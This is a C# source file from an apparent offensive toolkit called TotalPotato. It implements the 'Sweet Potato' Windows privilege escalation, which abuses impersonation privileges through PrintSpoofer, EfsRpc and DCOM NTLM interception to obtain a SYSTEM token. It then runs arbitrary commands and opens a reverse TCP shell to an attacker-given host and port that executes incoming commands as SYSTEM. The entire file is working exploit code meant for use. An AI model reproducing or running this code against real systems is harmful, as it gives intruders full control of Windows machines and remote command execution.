using System.Management;
using System.Net.Sockets;
using System.Runtime.InteropServices;
using System.Security.Principal;
using System.Text;
using static TotalPotato.ImpersonationToken;

namespace TotalPotato
{
    public class SweetPotato : IPotatoes
    {
        public string Name => "Sweet Potato";
        public string Description => "COM Elevation Variant";

        [DllImport("advapi32.dll", SetLastError = true, CharSet = CharSet.Auto)]
        public static extern bool ImpersonateLoggedOnUser(IntPtr hToken);

        [DllImport("advapi32.dll", SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        public static extern bool RevertToSelf();

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern IntPtr GetCurrentProcess();

        [DllImport("kernel32.dll", SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        public static extern bool CloseHandle(IntPtr hObject);

        [DllImport("advapi32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
        [return: MarshalAs(UnmanagedType.Bool)]
        public static extern bool CreateProcessAsUserW(
            IntPtr hToken,
            string lpApplicationName,
            string lpCommandLine,
            IntPtr lpProcessAttributes,
            IntPtr lpThreadAttributes,
            bool bInheritHandles,
            uint dwCreationFlags,
            IntPtr lpEnvironment,
            string lpCurrentDirectory,
            ref STARTUPINFO lpStartupInfo,
            out PROCESS_INFORMATION lpProcessInformation);

        [StructLayout(LayoutKind.Sequential)]
        public struct PROCESS_INFORMATION
        {
            public IntPtr hProcess;
            public IntPtr hThread;
            public uint dwProcessId;
            public uint dwThreadId;
        }

        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
        public struct STARTUPINFO
        {
            public int cb;
            public string lpReserved;
            public string lpDesktop;
            public string lpTitle;
            public int dwX;
            public int dwY;
            public int dwXSize;
            public int dwYSize;
            public int dwXCountChars;
            public int dwYCountChars;
            public int dwFillAttribute;
            public int dwFlags;
            public short wShowWindow;
            public short cbReserved2;
            public IntPtr lpReserved2;
            public IntPtr hStdInput;
            public IntPtr hStdOutput;
            public IntPtr hStdError;
        }

        private const uint HANDLE_FLAG_INHERIT = 0x00000001;
        private const uint HANDLE_FLAG_PROTECT_FROM_CLOSE = 0x00000002;

        private const uint CREATE_NO_WINDOW = 0x08000000;
        private const int STARTF_USESTDHANDLES = 0x00000100;
        private const uint INFINITE = 0xFFFFFFFF;

        [DllImport("ntdll.dll")]
        public static extern int NtSetInformationProcess(
            IntPtr ProcessHandle,
            int ProcessInformationClass,
            ref IntPtr ProcessInformation,
            int ProcessInformationLength
        );

        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern bool GetExitCodeProcess(IntPtr hProcess, out uint lpExitCode);

        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern bool TerminateProcess(IntPtr hProcess, uint uExitCode);

 
        private int CommandTimeout = 30000; private int ShellTimeout = 300000; private int ConnectionTimeout = 10000;
        public bool IsApplicable()
        {
            var osVersion = OSVersionHandler.GetOSVersion(); int build = osVersion.Build;
            int major = osVersion.Major;

            bool isWindows7OrLater = major >= 6; bool isSupportedBuild = build <= 22000;
            string[] patchKBs = new string[]
{
                "KB5004442",                 "KB5018410",                 "KB5021233",                 "KB5022282"
};

            bool isPatched = false;

            try
            {
                using (var searcher = new ManagementObjectSearcher("SELECT HotFixID FROM Win32_QuickFixEngineering"))
                {
                    var hotfixes = searcher.Get()
                                           .Cast<ManagementObject>()
                                           .Select(hf => hf["HotFixID"]?.ToString())
                                           .Where(id => !string.IsNullOrEmpty(id))
                                           .ToList();

                    foreach (string patch in patchKBs)
                    {
                        if (hotfixes.Contains(patch, StringComparer.OrdinalIgnoreCase))
                        {
                            Console.ForegroundColor = ConsoleColor.Yellow;
                            Console.WriteLine($"[!] Patch {patch} is installed. System likely NOT vulnerable to SweetPotato.");
                            Console.ResetColor();
                            isPatched = true;
                            break;
                        }
                    }

                    if (!isPatched)
                    {
                        Console.ForegroundColor = ConsoleColor.Green;
                        Console.WriteLine("[*] No known SweetPotato patch KBs detected.");
                        Console.ResetColor();
                    }
                }
            }
            catch (Exception ex)
            {
                Console.ForegroundColor = ConsoleColor.Red;
                Console.WriteLine($"[X] Failed to check hotfixes: {ex.Message}");
                Console.ResetColor();
            }

            return isWindows7OrLater && isSupportedBuild && !isPatched;
        }
        public void VerbosePrint(string message, ConsoleColor color = ConsoleColor.White)
        {
            Console.ForegroundColor = color;
            Console.WriteLine(message);
            Console.ResetColor();
        }

        public bool Execute(string command, string rev_host, int rev_port)
        {
            string[] allClsIds = new string[] {
                "4991D34B-80A1-4291-83B6-3328366B9097",                 
                "F087771F-D74F-4C1A-BB8A-E16ACA9124EA",                 
                "C49E32C6-BC8B-11D2-85D4-00105A1F8304",            
                "00000000-0000-0000-C000-000000000046",             
                "00000306-0000-0000-C000-000000000046",             
                "8BC3F05E-D86B-11D0-A075-00C04FB68820",             
                "D99E6E73-FC88-11D0-B498-00A0C90312F3",             
                "0289a7c5-91bf-4547-81ae-fec91a89dec5",             
                "7AB36653-1796-484B-BDFA-E74F1DB7C1DC"};

            ushort port = 6666;
            string program = @"c:\Windows\System32\cmd.exe";
            PotatoAPI.Mode mode = PotatoAPI.Mode.EfsRpc;
            ExecutionMethod executionMethod = ExecutionMethod.Auto;

            try
            {
                bool hasImpersonate = EnablePrivilege(SecurityEntity.SE_IMPERSONATE_NAME);
                bool hasPrimary = EnablePrivilege(SecurityEntity.SE_ASSIGNPRIMARYTOKEN_NAME);
                bool hasIncreaseQuota = EnablePrivilege(SecurityEntity.SE_INCREASE_QUOTA_NAME);

                if (!hasImpersonate && !hasPrimary)
                {
                    Console.WriteLine("[!] Cannot perform interception, necessary privileges missing. Are you running under a Service account?");
                    return false;
                }

                if (executionMethod == ExecutionMethod.Auto)
                {
                    if (hasImpersonate)
                    {
                        executionMethod = ExecutionMethod.Token;
                    }
                    else if (hasPrimary)
                    {
                        executionMethod = ExecutionMethod.User;
                    }
                }

                bool exploitSuccess = false;
                PotatoAPI potatoAPI = null;

                if (TryNamedPipeExploits(out potatoAPI))
                {
                    exploitSuccess = true;
                    Console.WriteLine("[+] Named pipe exploitation succeeded");
                }
                else
                {
                    Console.WriteLine("[*] Named pipe methods failed, trying DCOM with multiple CLSIDs");
                    foreach (string clsId in allClsIds)
                    {
                        Console.WriteLine($"[+] Attempting DCOM NTLM interception with CLSID {clsId} on port {port}");

                        potatoAPI = new PotatoAPI(new Guid(clsId), port, PotatoAPI.Mode.DCOM);

                        if (potatoAPI.Trigger())
                        {
                            if (potatoAPI.Token != IntPtr.Zero)
                            {
                                Console.WriteLine($"[+] Successfully obtained token using CLSID: {clsId}");
                                exploitSuccess = true;
                                break;
                            }
                            else
                            {
                                Console.WriteLine($"[!] Failed to obtain a valid token with CLSID: {clsId}");
                            }
                        }
                        else
                        {
                            Console.WriteLine($"[!] No authenticated interception took place with CLSID: {clsId}");
                        }

                        Thread.Sleep(500);
                    }
                }

                if (!exploitSuccess || potatoAPI == null || potatoAPI.Token == IntPtr.Zero)
                {
                    Console.WriteLine("[!] All modes have failed.");
                    return false;
                }

                Console.WriteLine("[+] Intercepted and authenticated successfully, launching program");

                IntPtr impersonatedPrimary = IntPtr.Zero;

                if (!DuplicateTokenEx(potatoAPI.Token, TOKEN_ALL_ACCESS, IntPtr.Zero,
                    SECURITY_IMPERSONATION_LEVEL.SecurityImpersonation, TOKEN_TYPE.TokenPrimary, out impersonatedPrimary))
                {
                    Console.WriteLine("[!] Failed to duplicate security context token");
                    return false;
                }

                using (ManualResetEvent threadDone = new ManualResetEvent(false))
                {
                    string resultOutput = string.Empty;

                    Thread systemThread = new Thread(() =>
                    {
                        try
                        {
                            if (!ImpersonateLoggedOnUser(potatoAPI.Token))
                            {
                                int error = Marshal.GetLastWin32Error();
                                VerbosePrint($"[!] ImpersonateLoggedOnUser failed with error code: {error}");
                                threadDone.Set();
                                return;
                            }

                            WindowsIdentity identity = WindowsIdentity.GetCurrent(true);
                            Console.WriteLine($"[+] Current identity after impersonation: {identity.Name}");

                            if (!string.IsNullOrEmpty(command))
                            {
                                ExecuteCommandWithSystemToken(impersonatedPrimary, command, out resultOutput);
                                Console.WriteLine("[+] Command executed successfully");
                                Console.WriteLine("[+] Output:");
                                Console.WriteLine(resultOutput);
                            }

                            if (!string.IsNullOrEmpty(rev_host) && rev_port > 0)
                            {
                                try
                                {
                                    RunTcpShellWithSystemToken(impersonatedPrimary, rev_host, rev_port);
                                }
                                catch (Exception ex)
                                {
                                    Console.WriteLine($"[!] Failed to establish reverse connection: {ex.Message}");
                                }
                            }
                        }
                        catch (Exception ex)
                        {
                            Console.WriteLine($"[!] Error in impersonation thread: {ex.Message}");
                        }
                        finally
                        {
                            try
                            {
                                RevertToSelf();
                            }
                            catch (Exception ex)
                            {
                                Console.WriteLine($"[!] Failed to revert impersonation: {ex.Message}");
                            }

                            threadDone.Set();
                        }
                    });

                    systemThread.Start();

                    if (!threadDone.WaitOne(ShellTimeout))
                    {
                        Console.WriteLine("[!] Thread execution timed out");
                    }
                    else
                    {
                        Console.WriteLine("[+] Execution completed");
                    }
                }

                if (impersonatedPrimary != IntPtr.Zero)
                {
                    CloseHandle(impersonatedPrimary);
                }
                return true;
            }
            catch (Exception e)
            {
                Console.WriteLine("[!] Failed to exploit COM: {0}", e.Message);
                VerbosePrint(e.StackTrace.ToString());
                return false;
            }
        }

        private bool TryNamedPipeExploits(out PotatoAPI potatoAPI)
        {
            potatoAPI = null;
            ushort port = 6666;

            try
            {
                Console.WriteLine("[+] Attempting PrintSpoofer named pipe impersonation technique");
                potatoAPI = new PotatoAPI(Guid.Empty, port, PotatoAPI.Mode.PrintSpoofer);

                if (potatoAPI.Trigger() && potatoAPI.Token != IntPtr.Zero)
                {
                    Console.WriteLine("[+] PrintSpoofer exploitation succeeded");
                    return true;
                }

                Console.WriteLine("[+] PrintSpoofer failed, trying EfsRpc technique");
                potatoAPI = new PotatoAPI(Guid.Empty, port, PotatoAPI.Mode.EfsRpc);

                if (potatoAPI.Trigger() && potatoAPI.Token != IntPtr.Zero)
                {
                    Console.WriteLine("[+] EfsRpc exploitation succeeded");
                    return true;
                }

                Console.WriteLine("[!] Named pipe exploitation techniques failed");
                return false;
            }
            catch (Exception ex)
            {
                Console.WriteLine($"[!] Error in named pipe exploitation: {ex.Message}");
                return false;
            }
        }

        private bool ExecuteCommandWithSystemToken(IntPtr tokenHandle, string command, out string output)
        {
            output = string.Empty;

            IntPtr hStdOutRead = IntPtr.Zero;
            IntPtr hStdOutWrite = IntPtr.Zero;
            IntPtr hStdErrRead = IntPtr.Zero;
            IntPtr hStdErrWrite = IntPtr.Zero;

            try
            {
                SECURITY_ATTRIBUTES saAttr = new SECURITY_ATTRIBUTES();
                saAttr.nLength = Marshal.SizeOf(typeof(SECURITY_ATTRIBUTES));
                saAttr.bInheritHandle = true;
                saAttr.lpSecurityDescriptor = IntPtr.Zero;

                if (!CreatePipe(out hStdOutRead, out hStdOutWrite, ref saAttr, 0))
                {
                    Console.WriteLine($"[!] Failed to create stdout pipe: {Marshal.GetLastWin32Error()}");
                    return false;
                }

                if (!SetHandleInformation(hStdOutRead, HANDLE_FLAG_INHERIT, 0))
                {
                    Console.WriteLine($"[!] Failed to set stdout handle information: {Marshal.GetLastWin32Error()}");
                    return false;
                }

                if (!CreatePipe(out hStdErrRead, out hStdErrWrite, ref saAttr, 0))
                {
                    Console.WriteLine($"[!] Failed to create stderr pipe: {Marshal.GetLastWin32Error()}");
                    return false;
                }

                if (!SetHandleInformation(hStdErrRead, HANDLE_FLAG_INHERIT, 0))
                {
                    Console.WriteLine($"[!] Failed to set stderr handle information: {Marshal.GetLastWin32Error()}");
                    return false;
                }

                STARTUPINFO startupInfo = new STARTUPINFO();
                startupInfo.cb = Marshal.SizeOf(typeof(STARTUPINFO));
                startupInfo.dwFlags = STARTF_USESTDHANDLES;
                startupInfo.hStdOutput = hStdOutWrite;
                startupInfo.hStdError = hStdErrWrite;

                string workingDir = Environment.GetFolderPath(Environment.SpecialFolder.System);

                PROCESS_INFORMATION processInfo = new PROCESS_INFORMATION();
                string cmdLine = $"cmd.exe /c {command}";

                bool success = CreateProcessAsUserW(
                    tokenHandle,
                    null,
                    cmdLine,
                    IntPtr.Zero,
                    IntPtr.Zero,
                    true,
                    CREATE_NO_WINDOW,
                    IntPtr.Zero,
                    workingDir,
                    ref startupInfo,
                    out processInfo);

                if (!success)
                {
                    Console.WriteLine($"[!] CreateProcessAsUserW failed: {Marshal.GetLastWin32Error()}");
                    return false;
                }

                CloseHandle(hStdOutWrite);
                hStdOutWrite = IntPtr.Zero;
                CloseHandle(hStdErrWrite);
                hStdErrWrite = IntPtr.Zero;

                StringBuilder stdoutBuilder = ReadPipeToEnd(hStdOutRead);
                StringBuilder stderrBuilder = ReadPipeToEnd(hStdErrRead);

                uint waitResult = WaitForSingleObject(processInfo.hProcess, (uint)CommandTimeout);

                if (waitResult == 0x102)
                {
                    Console.WriteLine("[!] Process execution timed out, terminating process");
                    TerminateProcess(processInfo.hProcess, 1);
                }

                uint exitCode = 0;
                GetExitCodeProcess(processInfo.hProcess, out exitCode);

                output = stdoutBuilder.ToString();
                string errorOutput = stderrBuilder.ToString();

                if (!string.IsNullOrEmpty(errorOutput))
                {
                    output += "\nERROR: " + errorOutput;
                }

                if (exitCode != 0)
                {
                    output += $"\n[Process exited with code: {exitCode}]";
                }

                CloseHandle(processInfo.hProcess);
                CloseHandle(processInfo.hThread);

                return true;
            }
            catch (Exception ex)
            {
                Console.WriteLine($"[!] Error executing command: {ex.Message}");
                output = $"ERROR: {ex.Message}";
                return false;
            }
            finally
            {
                if (hStdOutRead != IntPtr.Zero) CloseHandle(hStdOutRead);
                if (hStdOutWrite != IntPtr.Zero) CloseHandle(hStdOutWrite);
                if (hStdErrRead != IntPtr.Zero) CloseHandle(hStdErrRead);
                if (hStdErrWrite != IntPtr.Zero) CloseHandle(hStdErrWrite);
            }
        }

        private StringBuilder ReadPipeToEnd(IntPtr pipeHandle)
        {
            StringBuilder output = new StringBuilder();
            byte[] buffer = new byte[4096];
            uint bytesRead = 0;
            bool success;

            do
            {
                success = ReadFile(pipeHandle, buffer, (uint)buffer.Length, out bytesRead, IntPtr.Zero);
                if (success && bytesRead > 0)
                {
                    output.Append(Encoding.Default.GetString(buffer, 0, (int)bytesRead));
                }
            } while (success && bytesRead > 0);

            return output;
        }

        private void RunTcpShellWithSystemToken(IntPtr tokenHandle, string host, int port)
        {
            try
            {
                using (TcpClient client = new TcpClient())
                {
                    Console.WriteLine($"[+] Connecting to {host}:{port}");

                    var connectResult = client.BeginConnect(host, port, null, null);
                    bool connectionSuccess = connectResult.AsyncWaitHandle.WaitOne(ConnectionTimeout);

                    if (!connectionSuccess)
                    {
                        throw new TimeoutException("Connection attempt timed out");
                    }

                    client.EndConnect(connectResult);

                    Console.WriteLine("[+] Connection established!");

                    client.ReceiveTimeout = ConnectionTimeout;
                    client.SendTimeout = ConnectionTimeout;

                    using (NetworkStream stream = client.GetStream())
                    using (StreamReader reader = new StreamReader(stream))
                    using (StreamWriter writer = new StreamWriter(stream) { AutoFlush = true })
                    {
                        WindowsIdentity identity = WindowsIdentity.GetCurrent(true);

                        writer.WriteLine($"[+] Elevated connection established from {Environment.MachineName} - {identity.Name}");
                        writer.WriteLine($"[+] OS Version: {Environment.OSVersion}");
                        writer.WriteLine($"[+] Using token handle: 0x{tokenHandle.ToInt64():X}");

                        while (IsClientConnected(client))
                        {
                            try
                            {
                                string command = reader.ReadLine();

                                if (string.IsNullOrEmpty(command))
                                    continue;

                                if (command.ToLower() == "exit")
                                    break;

                                if (command.ToLower() == "whoami")
                                {
                                    writer.WriteLine($"Current identity: {identity.Name}");
                                    writer.WriteLine("[END_OF_OUTPUT]");
                                    continue;
                                }

                                string cmdOutput;
                                bool success = ExecuteCommandWithSystemToken(tokenHandle, command, out cmdOutput);

                                if (success)
                                {
                                    writer.WriteLine(cmdOutput);
                                }
                                else
                                {
                                    writer.WriteLine($"[!] Failed to execute command");
                                }
                                writer.WriteLine("[END_OF_OUTPUT]");
                            }
                            catch (IOException ex)
                            {
                                if (!IsClientConnected(client))
                                {
                                    Console.WriteLine("[!] Connection lost");
                                    break;
                                }

                                try
                                {
                                    writer.WriteLine($"[!] I/O error: {ex.Message}");
                                    writer.WriteLine("[END_OF_OUTPUT]");
                                }
                                catch
                                {
                                    break;
                                }
                            }
                            catch (Exception ex)
                            {
                                try
                                {
                                    writer.WriteLine($"[!] Error executing command: {ex.Message}");
                                    writer.WriteLine("[END_OF_OUTPUT]");
                                }
                                catch
                                {
                                    break;
                                }
                            }
                        }
                    }
                }
            }
            catch (Exception e)
            {
                Console.WriteLine("[!] Failed to connect to TCP: {0}", e.Message);
                Console.WriteLine(e.StackTrace.ToString());
            }
        }

        private bool IsClientConnected(TcpClient client)
        {
            try
            {
                if (client == null || !client.Connected)
                    return false;

                if (client.Client.Poll(0, SelectMode.SelectRead))
                {
                    byte[] buff = new byte[1];
                    if (client.Client.Receive(buff, SocketFlags.Peek) == 0)
                    {
                        return false;
                    }
                }

                return true;
            }
            catch
            {
                return false;
            }
        }

        #region Additional P/Invoke methods for process creation

        [StructLayout(LayoutKind.Sequential)]
        public struct SECURITY_ATTRIBUTES
        {
            public int nLength;
            public IntPtr lpSecurityDescriptor;
            [MarshalAs(UnmanagedType.Bool)]
            public bool bInheritHandle;
        }

        [DllImport("kernel32.dll", SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool CreatePipe(out IntPtr hReadPipe, out IntPtr hWritePipe,
            ref SECURITY_ATTRIBUTES lpPipeAttributes, uint nSize);

        [DllImport("kernel32.dll", SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool SetHandleInformation(IntPtr hObject, uint dwMask, uint dwFlags);

        [DllImport("kernel32.dll", SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool ReadFile(IntPtr hFile, [Out] byte[] lpBuffer, uint nNumberOfBytesToRead,
            out uint lpNumberOfBytesRead, IntPtr lpOverlapped);

        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern uint WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);

        #endregion
    }
}